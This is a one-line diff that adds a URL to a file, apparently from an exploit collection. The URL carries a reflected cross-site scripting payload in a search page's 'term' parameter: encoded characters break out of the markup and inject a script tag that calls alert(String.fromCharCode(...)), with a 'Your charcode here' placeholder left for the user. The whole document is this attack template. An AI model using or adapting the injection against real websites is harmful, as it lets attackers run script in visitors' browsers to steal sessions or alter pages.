@@ -1,0 +1,1 @@
+http://www.example.com/index.php?term=&quot;&gt;&lt;script&gt;alert(String.fromCharCode(Your charcode here))&lt;%2Fscript&gt;&amp;sm=Search&amp;source=1&amp;req=search
